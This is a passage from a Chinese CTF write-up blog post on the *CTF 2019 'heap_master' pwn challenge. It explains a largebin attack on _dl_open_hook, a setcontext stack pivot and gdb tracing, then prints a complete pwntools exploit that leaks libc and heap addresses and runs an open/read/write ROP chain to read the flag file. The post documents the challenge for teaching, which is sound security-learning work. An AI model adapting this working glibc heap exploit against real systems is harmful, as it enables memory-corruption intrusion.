class="built_in">r8</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a5a5</span> &lt;setcontext+<span class="number">117</span>&gt;:     <span class="keyword">mov</span>    <span class="built_in">r9</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x30</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a5a9</span> &lt;setcontext+<span class="number">121</span>&gt;:     <span class="keyword">mov</span>    <span class="built_in">rdi</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdi</span>+<span class="number">0x68</span>]</span><br><span class="line"><span class="number">0x7ffff7a7a5ad</span> &lt;setcontext+<span class="number">125</span>&gt;:     <span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x7ffff7a7a5af</span> &lt;setcontext+<span class="number">127</span>&gt;:     <span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p>
+<p>总的来说，控制程序的流程如下：</p>
+<ol>
+<li>通过<code>largebin attack</code>覆盖<code>_dl_open_hook</code>的值为可控内存的指针</li>
+<li>程序在<code>malloc</code>或<code>free</code>报错的时候会把<code>_dl_open_hook</code>处的值加载到寄存器rbx中，接着会call该寄存器</li>
+<li>通过前一步的call，让程序跳转到控制<code>rdi</code>寄存器的gadget处，该gadget会再次提供任意地址调用的机会</li>
+<li>跳转到setcontext函数中控制所有寄存器的gadget处，将rsp劫持到可控的内存处开始ROP，读出flag</li>
+</ol>
+<p>把这个过程跟踪调试一遍，会更加清楚一些，调试过程如下：</p>
+<p>既然会加载<code>_dl_open_hook</code>的值到寄存器中，那么是在哪里加载的呢？加载之后又是在哪里call该寄存器的呢？调试的方法是找到<code>_dl_open_hook</code>所在的内存地址，然后下载该地址的访问断点</p>
+<blockquote>
+<p>rwatch * 0x7ffff7dd92e0</p>
+</blockquote>
+<p>这样就能在加载到寄存器的时候触发断点了，可以看到程序断在了访问该内存的地方，将<code>_dl_open_hook</code>的值加载到了rbx中</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511134208.png" alt=""></p>
+<p>继续跟进，这里有一次函数调用<code>call QWORD PTR [rbx]</code>，将跳转到我们控制<code>rdi</code>寄存器的gadget上去</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511134545.png" alt=""></p>
+<p>跟进该call调用，该gadget会把<code>rbx+0x48</code>处的值赋值到rdi寄存器，并会call <code>rbx+0x40</code>处的地址，所以在mmap的内存上布置如下的数据<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>, fake_dl_open)</span><br><span class="line"><span class="comment"># 程序会跳转到setcontext处执行，rdi的值会被赋值为heap+0x1000</span></span><br><span class="line"><span class="comment"># 进而可以控制关键的寄存器rsp来ROP</span></span><br><span class="line">edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x40</span>, p64(set_context)+p64(heap+<span class="number">0x1000</span>))</span><br></pre></td></tr></table></figure></p>
+<p>这是跳转到了setcontext处执行的情况，rsp将会被赋值为<code>$rdi+0xa0</code>处的值，这个地方是我们布置的ROP链的<code>开始位置+8</code>处，因为后面还有一个<code>push rcx</code>的操作</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511164133.png" alt=""></p>
+<p>接着便开始正常的ROP来获取flag</p>
+<p><img src="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20190511164556.png" alt=""></p>
+<h3 id="利用脚本-1"><a href="#利用脚本-1" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>该脚本只在程序给出的libc下才能成功读取flag，因为在本地环境下，没有找到能够控制rdi值的gadget，经过调试，<code>_dl_open_hook</code>的值是被加载到<code>rax</code>里面</p>
+<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK): </span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK): </span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK): </span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)    </span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path)) </span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#example</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(off)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> libc.address + off</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_add</span><span class="params">(p, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_edit</span><span class="params">(p, off, cont)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(cont)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_del</span><span class="params">(p, off)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(off))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(host, port=<span class="number">60001</span>)</span>:</span></span><br><span class="line">    context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        stdout = <span class="number">0x2620</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        elf = change_ld(<span class="string">'./heap_master'</span>, <span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">        p = elf.process(env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        context.log_level = <span class="string">'info'</span></span><br><span class="line">        stdout = <span class="number">0x5600</span></span><br><span class="line"></span><br><span class="line">    add = <span class="keyword">lambda</span> x: _add(p, x)</span><br><span class="line">    edit = <span class="keyword">lambda</span> x,y: _edit(p, x, y)</span><br><span class="line">    free = <span class="keyword">lambda</span> x: _del(p, x)</span><br><span class="line"></span><br><span class="line">    info(<span class="string">'stdout:'</span>+hex(stdout))</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7A0</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *0x555555554000+0xf71')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x8060</span></span><br><span class="line">    edit(offset+<span class="number">8</span>, p64(<span class="number">0x331</span>)) <span class="comment">#p1</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x330</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x411</span>)) <span class="comment">#p2</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x410</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>, p64(<span class="number">0x411</span>)) <span class="comment">#p3</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>+<span class="number">0x410</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x440</span>+<span class="number">0x440</span>, p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    free(offset+<span class="number">0x10</span>) <span class="comment">#p1</span></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) <span class="comment">#p2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x101</span>)*<span class="number">3</span>)</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x460</span>, p64(<span class="number">0x101</span>)*<span class="number">3</span>)</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x560</span>, p64(<span class="number">0x101</span>)*<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x370</span>)</span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>)</span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stdout = 0x2620</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x3f1</span>) + p64(<span class="number">0</span>) + p16(stdout<span class="number">-0x10</span>)) <span class="comment">#p2-&gt;bk</span></span><br><span class="line">    </span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x18</span>, p64(<span class="number">0</span>) + p16(stdout+<span class="number">0x19</span><span class="number">-0x20</span>)) <span class="comment">#p2-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>+<span class="number">0x440</span>) <span class="comment">#p3</span></span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *0x555555554000+0xf71')</span></span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        p.recv(<span class="number">0x18</span>)</span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - libc.symbols[<span class="string">'_IO_file_jumps'</span>]<span class="comment"># + 0x1fe0</span></span><br><span class="line">        info(<span class="string">'libc.address @ '</span>+hex(libc.address))</span><br><span class="line">        info(<span class="string">'libc.system @'</span>+hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">        heap = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x495cf800</span><span class="number">-0x495c7000</span>)</span><br><span class="line">        info(<span class="string">'heap @ '</span>+hex(heap))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        heap = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x495cf800</span><span class="number">-0x495c7000</span>)</span><br><span class="line">        info(<span class="string">'heap @ '</span>+hex(heap))</span><br><span class="line">        libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x83</span> - (<span class="number">0x7ffff7dd5600</span><span class="number">-0x7ffff7a37000</span>)<span class="comment"># + 0x1fe0</span></span><br><span class="line">        info(<span class="string">'libc.address @ '</span>+hex(libc.address))</span><br><span class="line">        info(<span class="string">'libc.system @'</span>+hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># yet another large bin attack</span></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    edit(offset+<span class="number">8</span>, p64(<span class="number">0x331</span>)) <span class="comment">#p1</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x330</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x511</span>)) <span class="comment">#p2</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x510</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>, p64(<span class="number">0x511</span>)) <span class="comment">#p3</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x510</span>, p64(<span class="number">0x31</span>))</span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x540</span>, p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    free(offset+<span class="number">0x10</span>) <span class="comment">#p1</span></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>) <span class="comment">#p2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x90</span>)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    edit(offset+<span class="number">8</span>+<span class="number">0x360</span>, p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">'_dl_open_hook'</span>]<span class="number">-0x10</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">'_dl_open_hook'</span>]<span class="number">-0x20</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *0x555555554000+0xf71')</span></span><br><span class="line">    free(offset+<span class="number">0x10</span>+<span class="number">0x360</span>+<span class="number">0x540</span>) <span class="comment">#p3</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger on free error</span></span><br><span class="line">    <span class="comment"># here if DEBUG==1 will not work, cause gadget that can control rdi</span></span><br><span class="line">    <span class="comment"># only exist in remote's libc</span></span><br><span class="line">    _IO_str_jump = p64(libc.address + <span class="number">0x39A500</span>)</span><br><span class="line">    p_rdi_r = g(<span class="number">0x1feea</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    p_rdx_rsi_r = g(<span class="number">0xf9619</span>) <span class="comment"># pop rdx ; pop rsi ; ret</span></span><br><span class="line">    set_context = g(<span class="number">0x43565</span>) <span class="comment"># setcontext</span></span><br><span class="line">    fake_dl_open = p64(libc.address + <span class="number">0x7FD7D</span>)</span><br><span class="line"></span><br><span class="line">    orw = [</span><br><span class="line">        p_rdi_r, heap,</span><br><span class="line">        p_rdx_rsi_r, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        libc.sym[<span class="string">'open'</span>],</span><br><span class="line">        p_rdi_r, <span class="number">3</span>,</span><br><span class="line">        p_rdx_rsi_r, <span class="number">0x100</span>, heap+<span class="number">0x1337</span>,</span><br><span class="line">        libc.sym[<span class="string">'read'</span>],</span><br><span class="line">        p_rdi_r, <span class="number">1</span>,</span><br><span class="line">        p_rdx_rsi_r, <span class="number">0x100</span>, heap+<span class="number">0x1337</span>,</span><br><span class="line">        libc.sym[<span class="string">'write'</span>],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">'./flag\x00\x00'</span> + flat(orw))</span><br><span class="line">    edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>, fake_dl_open)</span><br><span class="line">    edit(offset+<span class="number">0x360</span>+<span class="number">0x540</span>+<span class="number">0x40</span>, p64(set_context)+p64(heap+<span class="number">0x1000</span>))</span><br><span class="line">    edit(<span class="number">0x1000</span>+<span class="number">0xa0</span>, p64(heap+<span class="number">0x10</span>)+p64(p_rdi_r))</span><br><span class="line">    <span class="comment"># gdb.attach(p,'''</span></span><br><span class="line">    <span class="comment">#     b *0x555555554000+0xf71</span></span><br><span class="line">    <span class="comment">#     b *0x7ffff7b30f35</span></span><br><span class="line">    <span class="comment">#     b *0x7ffff7ab6d7d</span></span><br><span class="line">    <span class="comment">#     rwatch *0x7ffff7dd62e0</span></span><br><span class="line">    <span class="comment">#     rwatch *0x7ffff7dd92e0</span></span><br><span class="line">    <span class="comment">#     ''')</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    DEBUG=<span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        libc_path = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_path = <span class="string">'./libc.so.6'</span></span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line">    exploit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/5006" target="_blank" rel="noopener">https://xz.aliyun.com/t/5006</a></p>
+<p><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-heap_master" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-heap_master</a></p>
+<p><a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a href="https://bbs.pediy.com/thread-225849.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225849.htm</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/largebin-attack/" rel="tag"># largebin attack</a>
+          
+            <a href="/tags/IO-list-all/" rel="tag"># _IO_list_all</a>
+          
+            <a href="/tags/dl-open-hook/" rel="tag"># _dl_open_hook</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/08/IoT/arm固件加载地址/" rel="next" title="ARM固件加载基址">
+                <i class="fa fa-chevron-left"></i> ARM固件加载基址
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/09/CISCN/线下半决赛/" rel="prev" title="CISCN华北赛区半决赛部分pwn题解">
+                CISCN华北赛区半决赛部分pwn题解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">e3pem</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#starctf-heap-master题解"><span class="nav-number">1.</span> <span class="nav-text">starctf-heap_master题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目信息"><span class="nav-number">1.1.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#面临的问题"><span class="nav-number">1.2.</span> <span class="nav-text">面临的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#加载指定版本的libc"><span class="nav-number">1.3.</span> <span class="nav-text">加载指定版本的libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#largebin-attack-实现信息泄露"><span class="nav-number">1.4.</span> <span class="nav-text">largebin attack 实现信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#largebin-attack"><span class="nav-number">1.4.1.</span> <span class="nav-text">largebin attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修改stdout实现泄露"><span class="nav-number">1.4.2.</span> <span class="nav-text">修改stdout实现泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过-IO-list-all控制程序执行"><span class="nav-number">1.5.</span> <span class="nav-text">通过_IO_list_all控制程序执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本"><span class="nav-number">1.5.1.</span> <span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#通过-dl-open-hook控制程序执行"><span class="nav-number">1.6.</span> <span class="nav-text">通过_dl_open_hook控制程序执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span 